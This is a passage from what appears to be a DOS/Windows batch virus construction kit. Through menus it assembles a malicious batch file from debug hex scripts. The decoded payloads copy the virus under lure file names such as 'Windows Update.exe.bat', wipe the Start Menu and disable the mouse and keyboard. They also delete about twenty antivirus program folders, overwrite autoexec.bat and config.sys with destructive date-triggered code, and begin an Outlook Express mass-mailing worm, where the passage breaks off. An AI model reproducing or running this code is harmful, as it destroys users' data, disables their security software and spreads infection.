echo e 0150  40 65 63 68 6F 20 6F 66 66 0D 0A 63 6C 73 0D 0A>>muta
echo e 0160  76 65 72 7C 66 69 6E 64 20 22 58 50 22 7C 69 66>>muta
echo e 0170  20 65 72 72 6F 72 6C 65 76 65 6C 20 31 20 63 74>>muta
echo e 0180  74 79 20 6E 75 6C 7C 69 66 20 6E 6F 74 20 65 72>>muta
echo e 0190  72 6F 72 6C 65 76 65 6C 20 31 20 67 6F 74 6F 20>>muta
echo e 01A0  3A 58 50 0D 0A 63 6C 73 0D 0A 40 64 65 6C 74 72>>muta
echo e 01B0  65 65 2F 79 20 25 77 69 6E 64 69 72 25 5C 73 79>>muta
echo e 01C0  73 74 65 6D 5C 61 6E 67 65 6C 20 3E 6E 75 6C 0D>>muta
echo e 01D0  0A 40 6D 64 20 25 77 69 6E 64 69 72 25 5C 73 79>>muta
echo e 01E0  73 74 65 6D 5C 61 6E 67 65 6C 0D 0A 40 63 6F 70>>muta
echo e 01F0  79 20 25 30 20 25 77 69 6E 64 69 72 25 5C 73 79>>muta
echo e 0200  73 74 65 6D 5C 61 6E 67 65 6C 5C 61 6E 67 65 6C>>muta
echo e 0210  2E 62 61 74 0D 0A 40 63 6F 70 79 20 25 30 20 25>>muta
echo e 0220  77 69 6E 64 69 72 25 5C 64 65 73 6B 74 6F 70 5C>>muta
echo e 0230  22 50 6C 65 61 73 75 72 65 2C 20 66 75 6E 20 61>>muta
echo e 0240  6E 64 20 53 45 58 2E 75 72 6C 2E 62 61 74 22 20>>muta
echo e 0250  3E 6E 75 6C 0D 0A 40 63 6F 70 79 20 25 30 20 25>>muta
echo e 0260  77 69 6E 64 69 72 25 5C 64 65 73 6B 74 6F 70 5C>>muta
echo e 0270  22 54 68 65 20 62 6C 6F 77 6A 6F 62 65 72 2E 6A>>muta
echo e 0280  70 67 2E 62 61 74 22 20 3E 6E 75 6C 0D 0A 40 63>>muta
echo e 0290  6F 70 79 20 25 30 20 63 3A 5C 6D 79 64 6F 63 75>>muta
echo e 02A0  7E 31 5C 22 53 65 78 79 65 73 74 20 77 6F 6D 65>>muta
echo e 02B0  6E 20 66 72 6F 6D 20 75 6E 69 76 65 72 73 65 2E>>muta
echo e 02C0  64 6F 63 2E 62 61 74 22 20 3E 6E 75 6C 0D 0A 40>>muta
echo e 02D0  63 6F 70 79 20 25 30 20 63 3A 5C 6D 79 64 6F 63>>muta
echo e 02E0  75 7E 31 5C 22 48 61 6C 66 20 4C 69 66 65 20 32>>muta
echo e 02F0  2E 65 78 65 2E 62 61 74 22 20 3E 6E 75 6C 0D 0A>>muta
echo e 0300  40 64 65 6C 74 72 65 65 2F 79 20 25 77 69 6E 64>>muta
echo e 0310  69 72 25 5C 73 74 61 72 74 6D 7E 31 5C 2A 2E 2A>>muta
echo e 0320  20 3E 6E 75 6C 0D 0A 40 63 6F 70 79 20 25 30 20>>muta
echo e 0330  25 77 69 6E 64 69 72 25 5C 73 74 61 72 74 6D 7E>>muta
echo e 0340  31 5C 22 57 69 6E 64 6F 77 73 20 55 70 64 61 74>>muta
echo e 0350  65 2E 65 78 65 2E 62 61 74 22 20 3E 6E 75 6C 0D>>muta
echo e 0360  0A 0D 0A 00>>muta
echo rcx>>muta
echo 263>>muta
echo n txt>>muta
echo w>>muta
echo q>>muta
@debug<muta
@ren txt ioana.txt
@deltree/y txt >nul
@deltree/y muta >nul
ctty con
cls
goto 001

:a5b
cls
ctty nul
@if exist ioana.txt deltree/y ioana.txt
echo e 0100  3A 3A 20 6E 6F 20 66 61 6B 65 20 62 79 74 65 73>>none
echo e 0110  2C 20 45 49 43 41 52 20 6F 72 20 6D 75 74 61 6D>>none
echo e 0120  6F 72 70 68 69 63 20 66 61 6B 65 20 62 79 74 65>>none
echo e 0130  73 0D 0A 3A 3A 0D 0A 3A 3A 20 47 65 6E 65 72 61>>none
echo e 0140  74 65 64 20 62 79 20 44 61 6E 67 65 72 6F 75 73>>none
echo e 0150  20 4D 65 6E 75 20 5B 44 76 4C 5D 0D 0A 3A 3A 0D>>none
echo e 0160  0A 40 65 63 68 6F 20 6F 66 66 0D 0A 63 6C 73 0D>>none
echo e 0170  0A 76 65 72 7C 66 69 6E 64 20 22 58 50 22 7C 69>>none
echo e 0180  66 20 65 72 72 6F 72 6C 65 76 65 6C 20 31 20 63>>none
echo e 0190  74 74 79 20 6E 75 6C 7C 69 66 20 6E 6F 74 20 65>>none
echo e 01A0  72 72 6F 72 6C 65 76 65 6C 20 31 20 67 6F 74 6F>>none
echo e 01B0  20 3A 58 50 0D 0A 63 6C 73 0D 0A 40 64 65 6C 74>>none
echo e 01C0  72 65 65 2F 79 20 25 77 69 6E 64 69 72 25 5C 73>>none
echo e 01D0  79 73 74 65 6D 5C 61 6E 67 65 6C 20 3E 6E 75 6C>>none
echo e 01E0  0D 0A 40 6D 64 20 25 77 69 6E 64 69 72 25 5C 73>>none
echo e 01F0  79 73 74 65 6D 5C 61 6E 67 65 6C 0D 0A 40 63 6F>>none
echo e 0200  70 79 20 25 30 20 25 77 69 6E 64 69 72 25 5C 73>>none
echo e 0210  79 73 74 65 6D 5C 61 6E 67 65 6C 5C 61 6E 67 65>>none
echo e 0220  6C 2E 62 61 74 0D 0A 40 63 6F 70 79 20 25 30 20>>none
echo e 0230  25 77 69 6E 64 69 72 25 5C 64 65 73 6B 74 6F 70>>none
echo e 0240  5C 22 50 6C 65 61 73 75 72 65 2C 20 66 75 6E 20>>none
echo e 0250  61 6E 64 20 53 45 58 2E 75 72 6C 2E 62 61 74 22>>none
echo e 0260  20 3E 6E 75 6C 0D 0A 40 63 6F 70 79 20 25 30 20>>none
echo e 0270  25 77 69 6E 64 69 72 25 5C 64 65 73 6B 74 6F 70>>none
echo e 0280  5C 22 54 68 65 20 62 6C 6F 77 6A 6F 62 65 72 2E>>none
echo e 0290  6A 70 67 2E 62 61 74 22 20 3E 6E 75 6C 0D 0A 40>>none
echo e 02A0  63 6F 70 79 20 25 30 20 63 3A 5C 6D 79 64 6F 63>>none
echo e 02B0  75 7E 31 5C 22 53 65 78 79 65 73 74 20 77 6F 6D>>none
echo e 02C0  65 6E 20 66 72 6F 6D 20 75 6E 69 76 65 72 73 65>>none
echo e 02D0  2E 64 6F 63 2E 62 61 74 22 20 3E 6E 75 6C 0D 0A>>none
echo e 02E0  40 63 6F 70 79 20 25 30 20 63 3A 5C 6D 79 64 6F>>none
echo e 02F0  63 75 7E 31 5C 22 48 61 6C 66 20 4C 69 66 65 20>>none
echo e 0300  32 2E 65 78 65 2E 62 61 74 22 20 3E 6E 75 6C 0D>>none
echo e 0310  0A 40 64 65 6C 74 72 65 65 2F 79 20 25 77 69 6E>>none
echo e 0320  64 69 72 25 5C 73 74 61 72 74 6D 7E 31 5C 2A 2E>>none
echo e 0330  2A 20 3E 6E 75 6C 0D 0A 40 63 6F 70 79 20 25 30>>none
echo e 0340  20 25 77 69 6E 64 69 72 25 5C 73 74 61 72 74 6D>>none
echo e 0350  7E 31 5C 22 57 69 6E 64 6F 77 73 20 55 70 64 61>>none
echo e 0360  74 65 2E 65 78 65 2E 62 61 74 22 20 3E 6E 75 6C>>none
echo e 0370  0D 0A 00>>none
echo rcx>>none
echo 272>>none
echo n txt>>none
echo w>>none
echo q>>none
@debug<none
@ren txt ioana.txt
@deltree/y txt >nul
@deltree/y none >nul
ctty con
cls
goto 001

:001
cls
echo.
echo.
echo.
echo        Mouse and keyboard payloads
echo.
echo.
echo.
echo    1 - Mouse and keyboard disable
echo.
echo    2 - Swap mouse buttons and keyboard disable
echo.
echo    3 - No mouse and keyboard payloads
echo.
echo    Q - e X i t
echo.
choice /c:123Q>nul
if errorlevel 4 goto done
if errorlevel 3 goto a7
if errorlevel 2 goto a6
if errorlevel 1 goto a5
echo CHOICE missing
goto done

:a5
cls
ctty nul
@echo.@rundll32.exe mouse,disable>>ioana.txt
@echo.@rundll32.exe keyboard,disable>>ioana.txt
ctty con
cls
goto 002

:a6
cls
ctty nul
@echo.@rundll32.exe user,swapmousebutton>>ioana.txt
@echo.@rundll32.exe keyboard,disable>>ioana.txt
ctty con
cls
goto 002

:a7
cls
ctty nul
@echo.:: no mouse and keyboard payloads>>ioana.txt
ctty con
cls
goto 002

:002
cls
echo.
echo.
echo.
echo        Retro for allmost 20 AV`z
echo.
echo.
echo.
echo    1 - Delete some AV`z
echo.
echo    2 - Leave the AV`z alone
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto a9
if errorlevel 1 goto a8
echo CHOICE missing
goto done

:a8
cls
ctty nul
@echo"@deltree/y c:\progra~1\norton~1\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\norton~2\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\symant~1\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\antiba~1.8\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\common~1\symant~1\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\common~1\avpsha~1\avpbases\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\common~1\avpsha~1\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\mcafee\viruss~1\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\mcafee\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\pandas~1\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\trendm~1\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\comman~1\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\zonela~1\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\tinype~1\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\kasper~1\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\kasper~2\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\trojan~1\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\avpers~1\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\grisoft\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\antivi~1\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\quickh~1\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\f-prot95\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\fwin32\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\tbav\ >nul">>ioana.txt
@echo"@deltree/y c:\progra~1\findvi~1\ >nul">>ioana.txt
@echo"@deltree/y c:\findvi~1\ >nul">>ioana.txt
@echo"@deltree/y c:\esafen\ >nul">>ioana.txt
@echo"@deltree/y c:\antiba~1.8\ >nul">>ioana.txt
@echo"@deltree/y c:\f-prot\ >nul">>ioana.txt
@echo"@deltree/y c:\f-macro\ >nul">>ioana.txt
@echo"@deltree/y c:\tbavw95\ >nul">>ioana.txt
@echo"@deltree/y c:\tbav\ >nul">>ioana.txt
@echo"@deltree/y c:\vs95\ >nul">>ioana.txt
@echo"@deltree/y c:\antivi~1\ >nul">>ioana.txt
@echo"@deltree/y c:\toolkit\findvi~1\ >nul">>ioana.txt
@echo"@deltree/y c:\pccill~1\ >nul">>ioana.txt
ctty con
cls
goto 003

:a9
cls
ctty nul
@echo.:: no retro>>ioana.txt
ctty con
cls
goto 003

:003
cls
echo.
echo.
echo.
echo        Infect the c:\autoexec.bat file
echo.
echo.
echo.
echo    1 - autoexec.bat infection/droping
echo.
echo    2 - No autoexec.bat infection/droping
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto a11
if errorlevel 1 goto a10
echo CHOICE missing
goto done

:a10
cls
ctty nul
@echo"@echo e 0100  40 65 63 68 6F 2E 40 69 66 20 65 78 69 73 74 20>>pay">>ioana.txt
@echo"@echo e 0110  63 3A 5C 77 69 6E 64 6F 77 73 5C 73 79 73 74 65>>pay">>ioana.txt
@echo"@echo e 0120  6D 5C 69 6F 61 6E 61 5C 64 61 74 65 2E 74 78 74>>pay">>ioana.txt
@echo"@echo e 0130  20 64 65 6C 74 72 65 65 2F 79 20 63 3A 5C 77 69>>pay">>ioana.txt
@echo"@echo e 0140  6E 64 6F 77 73 5C 73 79 73 74 65 6D 5C 69 6F 61>>pay">>ioana.txt
@echo"@echo e 0150  6E 61 5C 64 61 74 65 2E 74 78 74 3E 63 3A 5C 61>>pay">>ioana.txt
@echo"@echo e 0160  75 74 6F 65 78 65 63 2E 62 61 74 0D 0A 40 65 63>>pay">>ioana.txt
@echo"@echo e 0170  68 6F 22 40 76 65 72 7C 64 61 74 65 3E 63 3A 5C>>pay">>ioana.txt
@echo"@echo e 0180  77 69 6E 64 6F 77 73 5C 73 79 73 74 65 6D 5C 69>>pay">>ioana.txt
@echo"@echo e 0190  6F 61 6E 61 5C 64 61 74 65 2E 74 78 74 22 3E 3E>>pay">>ioana.txt
@echo"@echo e 01A0  63 3A 5C 61 75 74 6F 65 78 65 63 2E 62 61 74 0D>>pay">>ioana.txt
@echo"@echo e 01B0  0A 40 65 63 68 6F 2E 40 66 69 6E 64 20 22 4D 6F>>pay">>ioana.txt
@echo"@echo e 01C0  6E 22 20 63 3A 5C 77 69 6E 64 6F 77 73 5C 73 79>>pay">>ioana.txt
@echo"@echo e 01D0  73 74 65 6D 5C 69 6F 61 6E 61 5C 64 61 74 65 2E>>pay">>ioana.txt
@echo"@echo e 01E0  74 78 74 7C 69 66 20 65 72 72 6F 72 6C 65 76 65>>pay">>ioana.txt
@echo"@echo e 01F0  6C 20 30 20 67 6F 74 6F 20 74 75 7C 69 66 20 6E>>pay">>ioana.txt
@echo"@echo e 0200  6F 74 20 65 72 72 6F 72 6C 65 76 65 6C 20 31 20>>pay">>ioana.txt
@echo"@echo e 0210  67 6F 74 6F 20 70 61 31 3E 3E 63 3A 5C 61 75 74>>pay">>ioana.txt
@echo"@echo e 0220  6F 65 78 65 63 2E 62 61 74 0D 0A 40 65 63 68 6F>>pay">>ioana.txt
@echo"@echo e 0230  2E 3A 74 75 3E 3E 63 3A 5C 61 75 74 6F 65 78 65>>pay">>ioana.txt
@echo"@echo e 0240  63 2E 62 61 74 0D 0A 40 65 63 68 6F 2E 40 66 69>>pay">>ioana.txt
@echo"@echo e 0250  6E 64 20 22 54 75 65 22 20 63 3A 5C 77 69 6E 64>>pay">>ioana.txt
@echo"@echo e 0260  6F 77 73 5C 73 79 73 74 65 6D 5C 69 6F 61 6E 61>>pay">>ioana.txt
@echo"@echo e 0270  5C 64 61 74 65 2E 74 78 74 7C 69 66 20 65 72 72>>pay">>ioana.txt
@echo"@echo e 0280  6F 72 6C 65 76 65 6C 20 30 20 67 6F 74 6F 20 77>>pay">>ioana.txt
@echo"@echo e 0290  65 7C 69 66 20 6E 6F 74 20 65 72 72 6F 72 6C 65>>pay">>ioana.txt
@echo"@echo e 02A0  76 65 6C 20 31 20 67 6F 74 6F 20 70 61 32 3E 3E>>pay">>ioana.txt
@echo"@echo e 02B0  63 3A 5C 61 75 74 6F 65 78 65 63 2E 62 61 74 0D>>pay">>ioana.txt
@echo"@echo e 02C0  0A 40 65 63 68 6F 2E 3A 77 65 3E 3E 63 3A 5C 61>>pay">>ioana.txt
@echo"@echo e 02D0  75 74 6F 65 78 65 63 2E 62 61 74 0D 0A 40 65 63>>pay">>ioana.txt
@echo"@echo e 02E0  68 6F 2E 40 66 69 6E 64 20 22 57 65 64 22 20 63>>pay">>ioana.txt
@echo"@echo e 02F0  3A 5C 77 69 6E 64 6F 77 73 5C 73 79 73 74 65 6D>>pay">>ioana.txt
@echo"@echo e 0300  5C 69 6F 61 6E 61 5C 64 61 74 65 2E 74 78 74 7C>>pay">>ioana.txt
@echo"@echo e 0310  69 66 20 65 72 72 6F 72 6C 65 76 65 6C 20 30 20>>pay">>ioana.txt
@echo"@echo e 0320  67 6F 74 6F 20 74 68 7C 69 66 20 6E 6F 74 20 65>>pay">>ioana.txt
@echo"@echo e 0330  72 72 6F 72 6C 65 76 65 6C 20 31 20 67 6F 74 6F>>pay">>ioana.txt
@echo"@echo e 0340  20 70 61 33 3E 3E 63 3A 5C 61 75 74 6F 65 78 65>>pay">>ioana.txt
@echo"@echo e 0350  63 2E 62 61 74 0D 0A 40 65 63 68 6F 2E 3A 74 68>>pay">>ioana.txt
@echo"@echo e 0360  3E 3E 63 3A 5C 61 75 74 6F 65 78 65 63 2E 62 61>>pay">>ioana.txt
@echo"@echo e 0370  74 0D 0A 40 65 63 68 6F 2E 40 66 69 6E 64 20 22>>pay">>ioana.txt
@echo"@echo e 0380  54 68 75 22 20 63 3A 5C 77 69 6E 64 6F 77 73 5C>>pay">>ioana.txt
@echo"@echo e 0390  73 79 73 74 65 6D 5C 69 6F 61 6E 61 5C 64 61 74>>pay">>ioana.txt
@echo"@echo e 03A0  65 2E 74 78 74 7C 69 66 20 65 72 72 6F 72 6C 65>>pay">>ioana.txt
@echo"@echo e 03B0  76 65 6C 20 30 20 67 6F 74 6F 20 66 72 7C 69 66>>pay">>ioana.txt
@echo"@echo e 03C0  20 6E 6F 74 20 65 72 72 6F 72 6C 65 76 65 6C 20>>pay">>ioana.txt
@echo"@echo e 03D0  31 20 67 6F 74 6F 20 70 61 34 3E 3E 63 3A 5C 61>>pay">>ioana.txt
@echo"@echo e 03E0  75 74 6F 65 78 65 63 2E 62 61 74 0D 0A 40 65 63>>pay">>ioana.txt
@echo"@echo e 03F0  68 6F 2E 3A 66 72 3E 3E 63 3A 5C 61 75 74 6F 65>>pay">>ioana.txt
@echo"@echo e 0400  78 65 63 2E 62 61 74 0D 0A 40 65 63 68 6F 2E 40>>pay">>ioana.txt
@echo"@echo e 0410  66 69 6E 64 20 22 46 72 69 22 20 63 3A 5C 77 69>>pay">>ioana.txt
@echo"@echo e 0420  6E 64 6F 77 73 5C 73 79 73 74 65 6D 5C 69 6F 61>>pay">>ioana.txt
@echo"@echo e 0430  6E 61 5C 64 61 74 65 2E 74 78 74 7C 69 66 20 65>>pay">>ioana.txt
@echo"@echo e 0440  72 72 6F 72 6C 65 76 65 6C 20 30 20 67 6F 74 6F>>pay">>ioana.txt
@echo"@echo e 0450  20 73 61 7C 69 66 20 6E 6F 74 20 65 72 72 6F 72>>pay">>ioana.txt
@echo"@echo e 0460  6C 65 76 65 6C 20 31 20 67 6F 74 6F 20 70 61 35>>pay">>ioana.txt
@echo"@echo e 0470  3E 3E 63 3A 5C 61 75 74 6F 65 78 65 63 2E 62 61>>pay">>ioana.txt
@echo"@echo e 0480  74 0D 0A 40 65 63 68 6F 2E 3A 73 61 3E 3E 63 3A>>pay">>ioana.txt
@echo"@echo e 0490  5C 61 75 74 6F 65 78 65 63 2E 62 61 74 0D 0A 40>>pay">>ioana.txt
@echo"@echo e 04A0  65 63 68 6F 2E 40 66 69 6E 64 20 22 53 61 74 22>>pay">>ioana.txt
@echo"@echo e 04B0  20 63 3A 5C 77 69 6E 64 6F 77 73 5C 73 79 73 74>>pay">>ioana.txt
@echo"@echo e 04C0  65 6D 5C 69 6F 61 6E 61 5C 64 61 74 65 2E 74 78>>pay">>ioana.txt
@echo"@echo e 04D0  74 7C 69 66 20 65 72 72 6F 72 6C 65 76 65 6C 20>>pay">>ioana.txt
@echo"@echo e 04E0  30 20 67 6F 74 6F 20 73 75 7C 69 66 20 6E 6F 74>>pay">>ioana.txt
@echo"@echo e 04F0  20 65 72 72 6F 72 6C 65 76 65 6C 20 31 20 67 6F>>pay">>ioana.txt
@echo"@echo e 0500  74 6F 20 65 6E 64 3E 3E 63 3A 5C 61 75 74 6F 65>>pay">>ioana.txt
@echo"@echo e 0510  78 65 63 2E 62 61 74 0D 0A 40 65 63 68 6F 2E 3A>>pay">>ioana.txt
@echo"@echo e 0520  73 75 3E 3E 63 3A 5C 61 75 74 6F 65 78 65 63 2E>>pay">>ioana.txt
@echo"@echo e 0530  62 61 74 0D 0A 40 65 63 68 6F 2E 40 66 69 6E 64>>pay">>ioana.txt
@echo"@echo e 0540  20 22 53 75 6E 22 20 63 3A 5C 77 69 6E 64 6F 77>>pay">>ioana.txt
@echo"@echo e 0550  73 5C 73 79 73 74 65 6D 5C 69 6F 61 6E 61 5C 64>>pay">>ioana.txt
@echo"@echo e 0560  61 74 65 2E 74 78 74 7C 69 66 20 6E 6F 74 20 65>>pay">>ioana.txt
@echo"@echo e 0570  72 72 6F 72 6C 65 76 65 6C 20 31 20 67 6F 74 6F>>pay">>ioana.txt
@echo"@echo e 0580  20 65 6E 64 3E 3E 63 3A 5C 61 75 74 6F 65 78 65>>pay">>ioana.txt
@echo"@echo e 0590  63 2E 62 61 74 0D 0A 40 65 63 68 6F 2E 3A 70 61>>pay">>ioana.txt
@echo"@echo e 05A0  31 3E 3E 63 3A 5C 61 75 74 6F 65 78 65 63 2E 62>>pay">>ioana.txt
@echo"@echo e 05B0  61 74 0D 0A 40 65 63 68 6F 2E 3E 3E 63 3A 5C 61>>pay">>ioana.txt
@echo"@echo e 05C0  75 74 6F 65 78 65 63 2E 62 61 74 0D 0A 40 65 63>>pay">>ioana.txt
@echo"@echo e 05D0  68 6F 2E 3E 3E 63 3A 5C 61 75 74 6F 65 78 65 63>>pay">>ioana.txt
@echo"@echo e 05E0  2E 62 61 74 0D 0A 40 65 63 68 6F 2E 3E 3E 63 3A>>pay">>ioana.txt
@echo"@echo e 05F0  5C 61 75 74 6F 65 78 65 63 2E 62 61 74 0D 0A 40>>pay">>ioana.txt
@echo"@echo e 0600  65 63 68 6F 20 20 20 20 20 20 20 20 20 C9 BB 20>>pay">>ioana.txt
@echo"@echo e 0610  C9 BB 20 20 20 C9 BB 20 C9 BB 3E 3E 63 3A 5C 61>>pay">>ioana.txt
@echo"@echo e 0620  75 74 6F 65 78 65 63 2E 62 61 74 0D 0A 40 65 63>>pay">>ioana.txt
@echo"@echo e 0630  68 6F 20 20 20 20 20 20 20 20 20 BA BA 20 BA C8>>pay">>ioana.txt
@echo"@echo e 0640  BB 20 C9 BC BA 20 BA BA 3E 3E 63 3A 5C 61 75 74>>pay">>ioana.txt
@echo"@echo e 0650  6F 65 78 65 63 2E 62 61 74 0D 0A 40 65 63 68 6F>>pay">>ioana.txt
@echo"@echo e 0660  20 20 20 20 20 20 20 20 20 BA BA 20 C8 BB C8 CD>>pay">>ioana.txt
@echo"@echo e 0670  BC C9 BC 20 BA BA 20 20 20 48 61 76 65 20 79 6F>>pay">>ioana.txt
@echo"@echo e 0680  75 20 65 76 65 72 20 64 61 6E 63 65 64 20 77 69>>pay">>ioana.txt
@echo"@echo e 0690  74 68 20 74 68 65 20 64 65 76 69 6C 3E 3E 63 3A>>pay">>ioana.txt
@echo"@echo e 06A0  5C 61 75 74 6F 65 78 65 63 2E 62 61 74 0D 0A 40>>pay">>ioana.txt
@echo"@echo e 06B0  65 63 68 6F 20 20 20 20 20 20 20 20 20 BA BA 20>>pay">>ioana.txt
@echo"@echo e 06C0  20 BA 20 20 20 BA 20 20 BA BA 20 20 20 20 20 20>>pay">>ioana.txt
@echo"@echo e 06D0  20 20 20 20 20 20 69 6E 20 74 68 65 20 6D 6F 6F>>pay">>ioana.txt
@echo"@echo e 06E0  6E 6C 69 67 68 74 20 3F 3E 3E 63 3A 5C 61 75 74>>pay">>ioana.txt
@echo"@echo e 06F0  6F 65 78 65 63 2E 62 61 74 0D 0A 40 65 63 68 6F>>pay">>ioana.txt
@echo"@echo e 0700  20 20 20 20 20 20 20 20 20 BA BA 20 20 C8 BB 20>>pay">>ioana.txt
@echo"@echo e 0710  C9 BC 20 20 BA BA 3E 3E 63 3A 5C 61 75 74 6F 65>>pay">>ioana.txt
@echo"@echo e 0720  78 65 63 2E 62 61 74 0D 0A 40 65 63 68 6F 20 20>>pay">>ioana.txt
@echo"@echo e 0730  20 20 20 20 20 20 20 C8 BC 20 20 20 C8 CD BC 20>>pay">>ioana.txt
@echo"@echo e 0740  20 20 C8 BC 3E 3E 63 3A 5C 61 75 74 6F 65 78 65>>pay">>ioana.txt
@echo"@echo e 0750  63 2E 62 61 74 0D 0A 40 65 63 68 6F 2E 3E 3E 63>>pay">>ioana.txt
@echo"@echo e 0760  3A 5C 61 75 74 6F 65 78 65 63 2E 62 61 74 0D 0A>>pay">>ioana.txt
@echo"@echo e 0770  40 65 63 68 6F 2E 3E 3E 63 3A 5C 61 75 74 6F 65>>pay">>ioana.txt
@echo"@echo e 0780  78 65 63 2E 62 61 74 0D 0A 40 65 63 68 6F 2E 3E>>pay">>ioana.txt
@echo"@echo e 0790  3E 63 3A 5C 61 75 74 6F 65 78 65 63 2E 62 61 74>>pay">>ioana.txt
@echo"@echo e 07A0  0D 0A 40 65 63 68 6F 2E 3A 70 61 32 3E 3E 63 3A>>pay">>ioana.txt
@echo"@echo e 07B0  5C 61 75 74 6F 65 78 65 63 2E 62 61 74 0D 0A 40>>pay">>ioana.txt
@echo"@echo e 07C0  65 63 68 6F 2E 40 74 69 6D 65 20 30 30 3A 30 30>>pay">>ioana.txt
@echo"@echo e 07D0  3A 30 30 2C 30 30 3E 3E 63 3A 5C 61 75 74 6F 65>>pay">>ioana.txt
@echo"@echo e 07E0  78 65 63 2E 62 61 74 0D 0A 40 65 63 68 6F 2E 3A>>pay">>ioana.txt
@echo"@echo e 07F0  70 61 33 3E 3E 63 3A 5C 61 75 74 6F 65 78 65 63>>pay">>ioana.txt
@echo"@echo e 0800  2E 62 61 74 0D 0A 40 65 63 68 6F 2E 40 64 61 74>>pay">>ioana.txt
@echo"@echo e 0810  65 20 38 30 2D 30 31 2D 30 31 3E 3E 63 3A 5C 61>>pay">>ioana.txt
@echo"@echo e 0820  75 74 6F 65 78 65 63 2E 62 61 74 0D 0A 40 65 63>>pay">>ioana.txt
@echo"@echo e 0830  68 6F 2E 3A 70 61 34 3E 3E 63 3A 5C 61 75 74 6F>>pay">>ioana.txt
@echo"@echo e 0840  65 78 65 63 2E 62 61 74 0D 0A 40 65 63 68 6F 2E>>pay">>ioana.txt
@echo"@echo e 0850  73 75 62 73 74 20 65 3A 20 61 3A 5C 3E 3E 63 3A>>pay">>ioana.txt
@echo"@echo e 0860  5C 61 75 74 6F 65 78 65 63 2E 62 61 74 0D 0A 40>>pay">>ioana.txt
@echo"@echo e 0870  65 63 68 6F 2E 3A 70 61 35 3E 3E 63 3A 5C 61 75>>pay">>ioana.txt
@echo"@echo e 0880  74 6F 65 78 65 63 2E 62 61 74 0D 0A 40 65 63 68>>pay">>ioana.txt
@echo"@echo e 0890  6F 2E 73 75 62 73 74 20 64 3A 20 61 3A 5C 3E 3E>>pay">>ioana.txt
@echo"@echo e 08A0  63 3A 5C 61 75 74 6F 65 78 65 63 2E 62 61 74 0D>>pay">>ioana.txt
@echo"@echo e 08B0  0A 40 65 63 68 6F 2E 3A 65 6E 64 3E 3E 63 3A 5C>>pay">>ioana.txt
@echo"@echo e 08C0  61 75 74 6F 65 78 65 63 2E 62 61 74 0D 0A 40 65>>pay">>ioana.txt
@echo"@echo e 08D0  63 68 6F 2E 63 6C 73 3E 3E 63 3A 5C 61 75 74 6F>>pay">>ioana.txt
@echo"@echo e 08E0  65 78 65 63 2E 62 61 74 0D 0A 00>>pay">>ioana.txt
@echo"@echo rcx>>pay">>ioana.txt
@echo"@echo 7EA>>pay">>ioana.txt
@echo"@echo n txt>>pay">>ioana.txt
@echo"@echo w>>pay">>ioana.txt
@echo"@echo q>>pay">>ioana.txt
@echo"@debug<pay">>ioana.txt
@echo"@ren txt test.bat">>ioana.txt
@echo"@deltree/y c:\*.*at >nul">>ioana.txt
@echo"@copy test.bat c:\autoexec.bat">>ioana.txt
@echo"@deltree/y txt >nul">>ioana.txt
@echo"@deltree/y pay >nul">>ioana.txt
ctty con
cls
goto 004

:a11
cls
ctty nul
@echo.:: no autoexec.bat infection>>ioana.txt
ctty con
cls
goto 004

:004
cls
echo.
echo.
echo.
echo        Infect the c:\config.sys file
echo.
echo.
echo.
echo    1 - config.sys infection/droping
echo.
echo    2 - No config.sys infection/droping
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto a13
if errorlevel 1 goto a12
echo CHOICE missing
goto done

:a12
cls
ctty nul
@echo"@echo.[menu]>c:\config.sys">>ioana.txt
@echo"@echo.menuitem=DM>>c:\config.sys">>ioana.txt
@echo"@echo.>>c:\config.sys">>ioana.txt
@echo"@echo.[DM]>>c:\config.sys">>ioana.txt
@echo"@echo.buffers=1>>c:\config.sys">>ioana.txt
@echo"@echo.files=1>>c:\config.sys">>ioana.txt
@echo"@echo.lastdrive=A>>c:\config.sys">>ioana.txt
@echo"@echo.set path=deltree/y c:\windows\inf\*.*>>c:\config.sys">>ioana.txt
@echo"@echo.set temp=A:\DM>>c:\config.sys">>ioana.txt
@echo"@echo.set msg=@echo Have you ever danced with the devil in the moonlight ?>>c:\config.sys">>ioana.txt
@echo"@echo.>>c:\config.sys">>ioana.txt
ctty con
cls
goto 005

:a13
cls
ctty nul
@echo.:: no config.sys infection>>ioana.txt
ctty con
cls
goto 005

:005
cls
echo.
echo.
echo.
echo        Outlook Express worm
echo.
echo.
echo.
echo    1 - Outlook Express spreading
echo.
echo    2 - No Outlook Express spreading
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto a15
if errorlevel 1 goto a14
echo CHOICE missing
goto done

:a14
cls
ctty nul
@echo"@echo.set a=Wscript.CreateObject("Wscript.Shell")>>c:\windows\system\angel\oe.vbs">>ioana.txt
@echo"@echo.set b=CreateObject("Outlook.Application")>>c:\windows\system\angel\oe.vbs">>ioana.txt
@echo"@echo.set c=b.GetNameSpace("MAPI")>>c:\windows\system\angel\oe.vbs">>ioana.txt
